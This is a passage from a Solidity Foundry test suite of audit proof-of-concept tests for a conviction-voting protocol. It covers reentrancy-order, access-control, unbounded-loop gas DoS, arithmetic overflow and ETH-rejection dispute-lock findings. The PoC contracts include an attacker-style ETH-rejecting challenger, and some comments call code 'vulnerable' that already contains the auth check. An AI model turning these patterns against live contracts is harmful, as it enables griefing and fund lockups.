        escrow.initialize(oldBenef);
        escrow.setExternalCallTarget(address(observer));
    }

    /// @notice Security invariant: beneficiary should remain `oldBenef` during
    ///         the first outflow-update external call (effects must come after interactions).
    function test_H1_BeneficiaryMustNotUpdateBeforeFirstOutflowCall() public {
        assertEq(escrow.beneficiary(), oldBenef, "H-1 pre: beneficiary should be oldBenef");

        // setBeneficiary:
        //   1. writes beneficiary = newBenef   (STATE CHANGE)
        //   2. fires onExternalCall → observer captures escrow.beneficiary()
        escrow.setBeneficiary(newBenef);

        assertGe(observer.captureCount(), 1, "H-1: external call must have fired at least once");

        // Security assertion: observer should still see oldBenef during external call.
        console.log("[H-1] beneficiary captured during first outflow call:", observer.capturedBeneficiary());
        console.log("[H-1] oldBeneficiary (expected if CEI correct):", oldBenef);
        console.log("[H-1] newBeneficiary (should only appear after call completes):", newBenef);

        assertEq(
            observer.capturedBeneficiary(),
            oldBenef,
            "H-1: beneficiary changed before first external call (CEI violation)"
        );
        assertTrue(
            observer.capturedBeneficiary() != newBenef,
            "H-1: beneficiary must not already be newBenef during first outflow call"
        );
    }
}

// =============================================================
//  [H-3] rebalance() is permissionless - any caller can trigger it
// =============================================================
//
// NOTE: CVStreamingFacet imports Superfluid implementation files (^0.8.23) which
// conflict with allo-v2's =0.8.19 constraint.  We replicate the vulnerability
// pattern in a self-contained contract so the file compiles under ^0.8.19.

/// @dev Self-contained contract that replicates the EXACT vulnerability pattern of
///      CVStreamingFacet.rebalance() without importing Superfluid:
///
///      Real code (CVStreamingFacet.sol):
///        function rebalance() external {                   // ← NO auth check
///          ...
///          setLastRebalanceAt(block.timestamp);            // ← timestamp committed FIRST
///          for (uint256 i = 1; i <= proposalCounter; i++) // ← unbounded loop 1
///              { ... Superfluid external call ... }
///          for (uint256 i = 1; i <= proposalCounter; i++) // ← unbounded loop 2
///              { ... try escrow.syncOutflow() {} catch {} }
///        }
///
///      This harness replaces Superfluid calls with cheap arithmetic so we can
///      measure gas growth across loop iterations without external dependencies.
contract VulnerableRebalance {
    error Unauthorized(address caller);

    uint256 public lastRebalanceAt;
    uint256 public rebalanceCooldown;
    uint256 public proposalCounter;
    mapping(uint256 => bool) public activeProposals;
    mapping(address => bool) public authorizedCallers;
    uint256 internal _loopSink; // prevents loop elimination by optimizer

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice No access-control modifier — any EOA or contract can call.
    function rebalance() external {
        if (msg.sender != owner && !authorizedCallers[msg.sender]) {
            revert Unauthorized(msg.sender);
        }
        if (lastRebalanceAt != 0 && block.timestamp < lastRebalanceAt + rebalanceCooldown) {
            revert("cooldown active");
        }
        lastRebalanceAt = block.timestamp;   // ← state committed BEFORE loops (the bug)

        // Loop 1: mirrors the "update GDA units per proposal" loop
        for (uint256 i = 1; i <= proposalCounter; i++) {
            if (activeProposals[i]) {
                _loopSink += i; // non-trivial gas per iteration
            }
        }
        // Loop 2: mirrors the "topUp + syncOutflow per escrow" loop
        for (uint256 i = 1; i <= proposalCounter; i++) {
            if (activeProposals[i]) {
                _loopSink += 1;
            }
        }
    }

    function addProposal(uint256 id) external {
        activeProposals[id] = true;
        if (id > proposalCounter) proposalCounter = id;
    }

    function setCooldown(uint256 c) external {
        rebalanceCooldown = c;
    }

    function setAuthorizedCaller(address caller, bool authorized) external {
        if (msg.sender != owner) {
            revert Unauthorized(msg.sender);
        }
        authorizedCallers[caller] = authorized;
    }
}

/// @title PoC_H3_RebalancePermissionless
/// @notice Proves that rebalance() has NO access-control modifier — any address
///         can call it and commit state (lastRebalanceAt) unconditionally, and that
///         gas cost grows linearly with proposalCounter (unbounded-loop DoS).
contract PoC_H3_RebalancePermissionless is Test {
    VulnerableRebalance internal vulnerable;

    address internal owner    = makeAddr("owner");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.warp(1000);
        vm.roll(100);

        vulnerable = new VulnerableRebalance();
        vulnerable.setAuthorizedCaller(owner, true);
        // no cooldown initially
    }

    /// @notice Security invariant: unauthorized callers must not be able to rebalance.
    function test_H3_UnauthorizedCallerCannotWriteLastRebalanceAt() public {
        assertEq(vulnerable.lastRebalanceAt(), 0, "H-3 pre: lastRebalanceAt should be 0");

        // Call from an arbitrary address with no special role.
        vm.expectRevert();
        vm.prank(attacker);
        vulnerable.rebalance();

        uint256 lastRebalance = vulnerable.lastRebalanceAt();
        console.log("[H-3] lastRebalanceAt after attacker call:", lastRebalance);
        console.log("[H-3] block.timestamp:", block.timestamp);

        assertEq(lastRebalance, 0, "H-3: attacker must not be able to update lastRebalanceAt");
    }

    /// @notice Security invariant: attacker should not be able to squat cooldown windows.
    function test_H3_AttackerCannotSquatCooldownWindow() public {
        uint256 cooldownPeriod = 3600; // 1 hour
        vulnerable.setCooldown(cooldownPeriod);

        // Step 1: attacker call must fail.
        vm.expectRevert();
        vm.prank(attacker);
        vulnerable.rebalance();

        // Step 2: owner can call and set cooldown baseline legitimately.
        vm.prank(owner);
        vulnerable.rebalance();
        assertEq(vulnerable.lastRebalanceAt(), block.timestamp, "H-3: owner rebalance should succeed");

        // Step 3: attacker cannot force-reset cooldown while active.
        vm.warp(block.timestamp + cooldownPeriod - 1);
        vm.expectRevert();
        vm.prank(attacker);
        vulnerable.rebalance();

        console.log("[H-3] attacker could not squat the cooldown window");
    }

    /// @notice Gas scales linearly with proposal count — unbounded loop DoS vector.
    ///         Uses 10 vs 100 proposals so the loop delta is unambiguous even with
    ///         EVM cold-vs-warm storage variance between the two measurements.
    function test_H3_RebalanceMustStayGasBounded() public {
        for (uint256 i = 1; i <= 10; i++) {
            vulnerable.addProposal(i);
        }
        uint256 gasAt10 = _measureRebalanceGas();

        for (uint256 i = 11; i <= 100; i++) {
            vulnerable.addProposal(i);
        }
        uint256 gasAt100 = _measureRebalanceGas();

        console.log("[H-3] gas @ 10 proposals:", gasAt10);
        console.log("[H-3] gas @ 100 proposals:", gasAt100);
        uint256 gasPerProposal = gasAt100 / 100;
        uint256 estimate10000 = gasPerProposal * 10000;
        console.log("[H-3] gas per proposal (approx):", gasPerProposal);
        console.log("[H-3] estimated gas @ 10000 proposals:", estimate10000);

        assertLe(estimate10000, 30_000_000, "H-3: rebalance must remain callable under block gas limits");
    }

    function _measureRebalanceGas() internal returns (uint256 gasUsed) {
        vm.warp(block.timestamp + 1);
        uint256 g = gasleft();
        vulnerable.rebalance();
        gasUsed = g - gasleft();
    }
}

// =============================================================
//  [M-2] Arithmetic hazards in PowerManagementUtils
// =============================================================

/// @dev Mock IVotingPowerRegistry for PowerManagementUtils unit tests.
contract MockVotingPowerRegistry is IVotingPowerRegistry {
    uint256 public memberPower;
    uint256 public memberStake;
    address public erc;

    constructor(uint256 power, uint256 stake, address _erc) {
        memberPower = power;
        memberStake = stake;
        erc = _erc;
    }

    function setMemberPower(uint256 p) external { memberPower = p; }
    function setMemberStake(uint256 s) external { memberStake = s; }

    function getMemberPowerInStrategy(address, address) external view returns (uint256) {
        return memberPower;
    }
    function getMemberStakedAmount(address) external view returns (uint256) {
        return memberStake;
    }
    function ercAddress() external view returns (address) {
        return erc;
    }
    function isMember(address) external pure returns (bool) {
        return true;
    }
}

/// @dev Wrapper that calls PowerManagementUtils external library functions.
///      Library external functions are called via DELEGATECALL, so we need
///      a thin contract wrapper to invoke them from tests.
contract PowerManagementWrapper {
    // Forward to the library
    function callIncreasePower(
        IVotingPowerRegistry reg,
        address member,
        uint256 amountToStake,
        PointSystem ps,
        uint256 maxAmount
    ) external returns (uint256) {
        return PowerManagementUtils.increasePower(reg, member, amountToStake, ps, maxAmount);
    }

    function callDecreasePower(
        IVotingPowerRegistry reg,
        address member,
        uint256 amountToUnstake,
        PointSystem ps,
        uint256 maxAmount
    ) external returns (uint256) {
        return PowerManagementUtils.decreasePower(reg, member, amountToUnstake, ps, maxAmount);
    }
}

/// @title PoC_M2_PowerManagementArithmetic
/// @notice Proves three arithmetic hazards in PowerManagementUtils:
///         (a) underflow in increasePowerCapped when memberPower > cap
///         (b) overflow in increasePowerQuadratic with astronomically large stake
///         (c) underflow in decreasePowerQuadratic when power registry is inconsistent
contract PoC_M2_PowerManagementArithmetic is Test {
    PowerManagementWrapper internal wrapper;
    MockVotingPowerRegistry internal reg;
    address internal member = makeAddr("member");

    function setUp() public {
        wrapper = new PowerManagementWrapper();
        // ERC address just needs to implement decimals() — use address(0) (no-op fallback)
        reg = new MockVotingPowerRegistry(0, 0, address(0));
    }

    // -------------------------------------------------------
    // (a) Underflow in increasePowerCapped
    // -------------------------------------------------------

    /// @notice Security invariant: capped increase must not underflow when memberPower > cap.
    function test_M2a_IncreasePowerCapped_NoUnderflow() public {
        uint256 cap         = 50 ether;
        uint256 memberPower = 100 ether; // ABOVE cap — could happen if cap was lowered
        uint256 amountToStake = 1 ether;

        reg.setMemberPower(memberPower);
        reg.setMemberStake(100 ether);

        console.log("[M-2a] cap:", cap);
        console.log("[M-2a] memberPower:", memberPower);
        console.log("[M-2a] amountToStake:", amountToStake);
        console.log("[M-2a] The subtraction cap - memberPower would underflow (100 > 50)");

        uint256 points = wrapper.callIncreasePower(reg, member, amountToStake, PointSystem.Capped, cap);
        assertEq(points, 0, "M-2a: above-cap stake must grant zero points instead of underflowing");
    }

    // -------------------------------------------------------
    // (b) Overflow in increasePowerQuadratic
    // -------------------------------------------------------

    /// @notice Security invariant: quadratic increase must handle huge stakes without overflow panic.
    function test_M2b_IncreasePowerQuadratic_NoOverflow() public {
        // totalStake will be memberStake + amountToStake
        // uint256.max ~= 1.157e77; uint256.max / 10^18 ~= 1.157e59
        // Use 1.2e59 to force overflow: 1.2e59 * 10^18 = 1.2e77 > uint256.max
        uint256 bigStake    = 12e58; // 1.2 * 10^59
        uint256 amountToStake = 1 ether;

        reg.setMemberStake(bigStake);
        reg.setMemberPower(0); // current power doesn't matter for overflow

        console.log("[M-2b] totalStake will be:", bigStake + amountToStake);
        console.log("[M-2b] totalStake * 10^18 overflows uint256 (max ~= 1.157e77)");

        uint256 points = wrapper.callIncreasePower(reg, member, amountToStake, PointSystem.Quadratic, 0);
        console.log("[M-2b] points returned without overflow panic:", points);
    }

    // -------------------------------------------------------
    // (c) Underflow in decreasePowerQuadratic
    // -------------------------------------------------------

    /// @notice Security invariant: quadratic decrease must not underflow on inconsistent registry state.
    function test_M2c_DecreasePowerQuadratic_NoUnderflow() public {
        // memberStake = 9 ether  =>  sqrt(9e18 * 1e18) = sqrt(9e36) = 3e18
        // memberPower = 1 ether  (LESS than expected 3e18)
        // After unstaking 1 wei: newStake = 9e18 - 1, newTotalPoints ~= 3e18 - 1
        // pointsToDecrease = 1e18 - (3e18 - 1) = UNDERFLOW
        uint256 memberStake = 9 ether;
        uint256 memberPower = 1 ether; // inconsistent: should be 3e18
        uint256 amountToUnstake = 1;   // 1 wei

        reg.setMemberStake(memberStake);
        reg.setMemberPower(memberPower);

        console.log("[M-2c] memberStake:", memberStake);
        console.log("[M-2c] memberPower (inconsistent):", memberPower);
        console.log("[M-2c] expected power from stake: ~3e18 (= sqrt(9e18 * 1e18))");
        console.log("[M-2c] decreasePower will underflow: 1e18 - (3e18 - 1)");

        uint256 points = wrapper.callDecreasePower(reg, member, amountToUnstake, PointSystem.Quadratic, 0);
        assertEq(points, 0, "M-2c: inconsistent state should yield zero decrease instead of panic underflow");
    }

    // -------------------------------------------------------
    // Normal path (sanity check - should NOT revert)
    // -------------------------------------------------------

    /// @notice Sanity check: normal capped increase works when memberPower < cap
    function test_M2_CappedIncrease_Normal() public {
        uint256 cap         = 100 ether;
        uint256 memberPower = 20 ether;  // below cap
        uint256 amountToStake = 10 ether;

        reg.setMemberPower(memberPower);
        reg.setMemberStake(20 ether);

        uint256 points = wrapper.callIncreasePower(reg, member, amountToStake, PointSystem.Capped, cap);
        console.log("[M-2 normal] points granted:", points);
        assertEq(points, amountToStake, "Normal capped: full amount granted (below cap)");
    }

    /// @notice Sanity check: capped increase clips at maxAmount correctly
    function test_M2_CappedIncrease_ClipsAtCap() public {
        uint256 cap         = 25 ether;
        uint256 memberPower = 20 ether;  // 5 ether below cap
        uint256 amountToStake = 10 ether; // would exceed cap

        reg.setMemberPower(memberPower);
        reg.setMemberStake(20 ether);

        uint256 points = wrapper.callIncreasePower(reg, member, amountToStake, PointSystem.Capped, cap);
        console.log("[M-2 clip] points granted (should be 5e18):", points);
        assertEq(points, cap - memberPower, "Capped: should clip to remaining cap space");
    }
}

// =============================================================
//  [M-7] Push-payment ETH-rejection must not lock disputed proposals
// =============================================================

/// @dev Challenger contract that can be toggled to reject incoming ETH.
contract ConditionalETHReceiver {
    IERC20 public immutable token;
    bool public rejectETH;

    constructor(IERC20 _token) {
        token = _token;
    }

    function setRejectETH(bool _reject) external {
        rejectETH = _reject;
    }

    receive() external payable {
        if (rejectETH) revert("ETH rejected by challenger contract");
    }

    function registerMember(address community, uint256 amount) external {
        token.approve(community, amount);
        RegistryCommunity(payable(community)).stakeAndRegisterMember("");
    }

    function challengeProposal(address strategy, uint256 proposalId, uint256 amount) external returns (uint256 disputeId) {
        disputeId = CVStrategy(payable(strategy)).disputeProposal{value: amount}(proposalId, "poc", "");
    }
}

/// @notice Security expectation:
/// - Dispute resolution must not depend on recipient ETH receive hooks succeeding.
/// - A challenger rejecting ETH must not keep proposal permanently Disputed.
contract PoC_M7_PushPaymentChallengerDoS is PoCBase {
    GV2ERC20 token;
    ConditionalETHReceiver rejector;
    address submitter = makeAddr("submitter");

    uint256 constant ARB_FEE = 1 ether;
    uint256 constant CHALLENGER_COL = 0.1 ether;
    uint256 constant SUBMITTER_COL = 0.2 ether;

    function setUp() public {
        _alloSetup();

        token = new GV2ERC20("Token", "TKN", 18);
        token.mint(local(), TOTAL_SUPPLY / 3);
        token.mint(submitter, TOTAL_SUPPLY / 3);

        _deployArbitrator(ARB_FEE);
        _deployFactory(address(token));
        _deployStrategy(ArbitrableConfig({
            arbitrator: IArbitrator(address(safeArbitrator)),
            tribunalSafe: payable(address(_councilSafe())),
            submitterCollateralAmount: SUBMITTER_COL,
            challengerCollateralAmount: CHALLENGER_COL,
            defaultRuling: 1,
            defaultRulingTimeout: 300
        }));

        vm.prank(address(cvStrategy));
        safeArbitrator.registerSafe(address(_councilSafe()));

        vm.prank(pool_admin());
        safeHelper(
            address(registryCommunity), 0, abi.encodeWithSelector(registryCommunity.addStrategy.selector, address(cvStrategy))
        );

        rejector = new ConditionalETHReceiver(IERC20(address(token)));
        token.mint(address(rejector), TOTAL_SUPPLY / 3);
        vm.deal(address(rejector), 10 ether);
        rejector.registerMember(address(registryCommunity), STAKE_WITH_FEES);

        _approveAndRegister(submitter);
        vm.prank(submitter);
        cvStrategy.activatePoints();

        vm.deal(address(this), POOL_AMOUNT);
        (bool ok,) = address(cvStrategy).call{value: POOL_AMOUNT}("");
        require(ok, "pool fund failed");
    }

    function test_M7_ETHRejectorMustNotLockDisputeResolution() public {
        uint256 proposalId = _createProposal(submitter, 0.5 ether);

        uint256 disputeId =
            rejector.challengeProposal(address(cvStrategy), proposalId, CHALLENGER_COL + ARB_FEE);

        (,,,,, ProposalStatus statusAfterDispute,,,,,, ) = cvStrategy.getProposal(proposalId);
        assertEq(uint256(statusAfterDispute), uint256(ProposalStatus.Disputed), "M-7 pre: proposal must be disputed");

        rejector.setRejectETH(true);

        // Fixed behavior: dispute resolution should still complete even if challenger rejects ETH.
        vm.prank(address(_councilSafe()));
        safeArbitrator.executeRuling(disputeId, 2, address(cvStrategy));

        (,,,,, ProposalStatus statusAfterRuling,,,,,, ) = cvStrategy.getProposal(proposalId);
        assertTrue(
            uint256(statusAfterRuling) != uint256(ProposalStatus.Disputed),
            "M-7: proposal must not remain permanently Disputed"
        );
    }
}

// =============================================================
//  [M-4b] voterStakedProposals growth must remain gas-bounded
// =============================================================

/// @notice Additional M-4 coverage for the inner _withdraw loop over voterStakedProposals.
/// This is the same vulnerability class as M-4 (no separate finding ID).
contract PoC_M4b_VoterStakedProposalsDoS is PoCBase {
    GV2ERC20 token;
    address victim = makeAddr("victim");
    address submitter = makeAddr("proposalSubmitter");

    uint256 constant ARB_FEE = 0.5 ether;

    function setUp() public {
        _alloSetup();

        token = new GV2ERC20("Token", "TKN", 18);
        token.mint(local(), TOTAL_SUPPLY / 3);
        token.mint(victim, TOTAL_SUPPLY / 3);
        token.mint(submitter, TOTAL_SUPPLY / 3);

        _deployArbitrator(ARB_FEE);
        _deployFactory(address(token));
        _deployStrategy(ArbitrableConfig({
            arbitrator: IArbitrator(address(safeArbitrator)),
            tribunalSafe: payable(address(_councilSafe())),
            submitterCollateralAmount: 0.02 ether,
            challengerCollateralAmount: 0.01 ether,
            defaultRuling: 1,
            defaultRulingTimeout: 300
        }));

        vm.prank(pool_admin());
        safeHelper(
            address(registryCommunity), 0, abi.encodeWithSelector(registryCommunity.addStrategy.selector, address(cvStrategy))
        );

        _approveAndRegister(victim);
        vm.prank(victim);
        cvStrategy.activatePoints();

        _approveAndRegister(submitter);
        vm.prank(submitter);
        cvStrategy.activatePoints();

        vm.deal(address(this), POOL_AMOUNT);
        (bool ok,) = address(cvStrategy).call{value: POOL_AMOUNT}("");
        require(ok, "pool fund failed");
    }

    function _createAndVoteOnProposal() internal {
        uint256 proposalId = _createProposal(submitter, 0.01 ether);

        ProposalSupport[] memory allocs = new ProposalSupport[](1);
        allocs[0] = ProposalSupport({proposalId: proposalId, deltaSupport: 1});
        vm.prank(victim);
        allo().allocate(poolId, abi.encode(allocs));
    }

    function _measureUnregisterGas() internal returns (uint256 gasUsed) {
        uint256 g = gasleft();
        vm.prank(victim);
        registryCommunity.unregisterMember();
        gasUsed = g - gasleft();
    }

    function _reRegisterVictim() internal {
        vm.prank(victim);
        token.approve(address(registryCommunity), STAKE_WITH_FEES);
        vm.prank(victim);
        registryCommunity.stakeAndRegisterMember("");
        vm.prank(victim);
        cvStrategy.activatePoints();
    }

    function test_M4b_UnregisterMustStayGasBoundedAsVotesGrow() public {
        for (uint256 i = 0; i < 5; i++) _createAndVoteOnProposal();
        uint256 gasAt5 = _measureUnregisterGas();

        _reRegisterVictim();
        for (uint256 i = 0; i < 15; i++) _createAndVoteOnProposal();
        uint256 gasAt20 = _measureUnregisterGas();

        _reRegisterVictim();
        for (uint256 i = 0; i < 20; i++) _createAndVoteOnProposal();
        uint256 gasAt40 = _measureUnregisterGas();

        // Security expectation: this path should remain bounded and not trend toward block-limit DoS.
        uint256 incrementalGasPerEntry = (gasAt40 - gasAt5) / 35;
        uint256 estimate1000 = gasAt5 + incrementalGasPerEntry * 995;

        console.log("[M-4b] unregisterMember gas @ 5 entries:", gasAt5);
        console.log("[M-4b] unregisterMember gas @ 20 entries:", gasAt20);
        console.log("[M-4b] unregisterMember gas @ 40 entries:", gasAt40);
        console.log("[M-4b] incremental gas/entry:", incrementalGasPerEntry);
        console.log("[M-4b] estimated gas @ 1000 entries:", estimate1000);

        assertLe(
            estimate1000,
            30_000_000,
            "M-4b: unregister/kick path must remain below block gas limit as voter history grows"
        );
    }
}
